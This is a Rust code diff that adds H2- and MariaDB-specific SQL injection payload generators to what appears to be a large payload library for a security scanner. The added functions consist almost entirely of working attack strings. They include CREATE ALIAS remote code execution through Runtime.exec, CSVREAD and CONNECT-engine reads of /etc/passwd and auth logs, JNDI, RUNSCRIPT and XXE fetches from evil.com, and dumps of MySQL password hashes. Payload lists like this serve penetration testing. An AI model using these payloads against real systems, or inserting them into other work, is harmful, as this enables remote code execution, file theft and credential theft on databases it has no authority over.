@@ -1586,6 +1586,131 @@ pub fn generate_oracle_specific_sqli() -> Vec<String> {
     payloads
 }
 
+/// H2 Database specific SQLi payloads (15+ payloads)
+/// Targets: H2 embedded database (Java), CREATE ALIAS RCE, CSVREAD file read, LINK_SCHEMA JNDI
+pub fn generate_h2_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // H2 version detection
+    payloads.extend(vec![
+        "' UNION SELECT NULL,H2VERSION()--".to_string(),
+        "' UNION SELECT NULL,DATABASE()--".to_string(),
+        "' AND 1=(SELECT H2VERSION())--".to_string(),
+    ]);
+
+    // H2 CREATE ALIAS Remote Code Execution
+    payloads.extend(vec![
+        "'; CREATE ALIAS EXEC AS 'void exec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd);}'--".to_string(),
+        "'; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws Exception{Runtime rt=Runtime.getRuntime();Process p=rt.exec(cmd);return new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\").next();}$$--".to_string(),
+        "'; CREATE ALIAS IF NOT EXISTS EXEC AS 'void exec(String c)throws Exception{Runtime.getRuntime().exec(c);}'--".to_string(),
+        "'; CALL EXEC('whoami')--".to_string(),
+    ]);
+
+    // H2 CSVREAD file read exploitation
+    payloads.extend(vec![
+        "' UNION SELECT * FROM CSVREAD('file:///etc/passwd')--".to_string(),
+        "' UNION SELECT * FROM CSVREAD('/etc/passwd')--".to_string(),
+        "' UNION SELECT NULL,C1 FROM CSVREAD('file:///etc/passwd')--".to_string(),
+        "' UNION SELECT * FROM CSVREAD('C:\\Windows\\win.ini')--".to_string(),
+    ]);
+
+    // H2 LINK_SCHEMA JNDI injection (CVE-2021-42392 style)
+    payloads.extend(vec![
+        "'; CREATE TABLE test AS SELECT * FROM LINK_SCHEMA('attackerdb','org.h2.Driver','jdbc:h2:mem:','sa','')--".to_string(),
+        "'; CREATE LINKED TABLE link(ID INT) DRIVER 'javax.naming.InitialContext' URL 'ldap://evil.com/a'--".to_string(),
+        "'; RUNSCRIPT FROM 'http://evil.com/exploit.sql'--".to_string(),
+    ]);
+
+    // H2 error-based extraction
+    payloads.extend(vec![
+        "' AND 1=CAST(USER() AS INT)--".to_string(),
+        "' AND 1=CONVERT(DATABASE(),INT)--".to_string(),
+    ]);
+
+    // H2 time-based blind
+    payloads.extend(vec![
+        "'; CALL SLEEP(5)--".to_string(),
+        "' AND 1=(SELECT SLEEP(5))--".to_string(),
+    ]);
+
+    // H2 system information
+    payloads.extend(vec![
+        "' UNION SELECT NULL,SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--".to_string(),
+        "' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--".to_string(),
+        "' UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--".to_string(),
+    ]);
+
+    payloads
+}
+
+/// MariaDB specific SQLi payloads (20+ payloads)
+/// Targets: MariaDB-specific functions, CONNECT engine, version detection, system tables
+pub fn generate_mariadb_specific_sqli() -> Vec<String> {
+    let mut payloads = Vec::new();
+
+    // MariaDB version detection (distinguishing from MySQL)
+    payloads.extend(vec![
+        "' UNION SELECT NULL,@@version--".to_string(),
+        "' UNION SELECT NULL,VERSION()--".to_string(),
+        "' AND VERSION() LIKE '%MariaDB%'--".to_string(),
+        "' AND @@version_comment LIKE '%mariadb%'--".to_string(),
+        "' UNION SELECT NULL,@@version_comment--".to_string(),
+    ]);
+
+    // MariaDB-specific functions
+    payloads.extend(vec![
+        "' UNION SELECT NULL,COLUMN_JSON((SELECT * FROM information_schema.tables LIMIT 1))--".to_string(),
+        "' UNION SELECT NULL,JSON_DETAILED((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--".to_string(),
+        "' UNION SELECT NULL,JSON_QUERY('{}','$')--".to_string(),
+        "' AND JSON_VALID('{}')--".to_string(),
+    ]);
+
+    // MariaDB CONNECT storage engine exploitation
+    payloads.extend(vec![
+        "'; CREATE TABLE exploit ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'--".to_string(),
+        "'; CREATE TABLE remote ENGINE=CONNECT TABLE_TYPE=MYSQL SRCDEF='SELECT * FROM mysql.user' HOST='localhost'--".to_string(),
+        "'; CREATE TABLE csvfile ENGINE=CONNECT TABLE_TYPE=CSV FILE_NAME='/var/log/auth.log'--".to_string(),
+        "'; CREATE TABLE xml_data ENGINE=CONNECT TABLE_TYPE=XML FILE_NAME='http://evil.com/xxe.xml'--".to_string(),
+    ]);
+
+    // MariaDB version-conditional execution
+    payloads.extend(vec![
+        "' /*!50503UNION*//*!50503SELECT*/NULL,user()--".to_string(),
+        "' /*!100000AND*/1=1--".to_string(),
+        "' /*!100508UNION SELECT*/NULL,@@version--".to_string(),
+    ]);
+
+    // MariaDB system tables and information
+    payloads.extend(vec![
+        "' UNION SELECT NULL,Host FROM mysql.user--".to_string(),
+        "' UNION SELECT NULL,authentication_string FROM mysql.user--".to_string(),
+        "' UNION SELECT NULL,plugin FROM mysql.user WHERE user='root'--".to_string(),
+        "' UNION SELECT NULL,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'--".to_string(),
+    ]);
+
+    // MariaDB time-based blind
+    payloads.extend(vec![
+        "' AND SLEEP(5)--".to_string(),
+        "' AND BENCHMARK(10000000,SHA1('test'))--".to_string(),
+        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--".to_string(),
+    ]);
+
+    // MariaDB error-based
+    payloads.extend(vec![
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--".to_string(),
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--".to_string(),
+        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)--".to_string(),
+    ]);
+
+    // MariaDB stored procedure injection
+    payloads.extend(vec![
+        "'; CALL mysql.rds_kill(1)--".to_string(),
+        "'; SET @q='SELECT * FROM users'; PREPARE stmt FROM @q; EXECUTE stmt--".to_string(),
+    ]);
+
+    payloads
+}
+
 /// Get all SQLi payloads (75,000+ total)
 pub fn get_all_sqli_payloads() -> Vec<String> {
     let mut all_payloads = Vec::new();
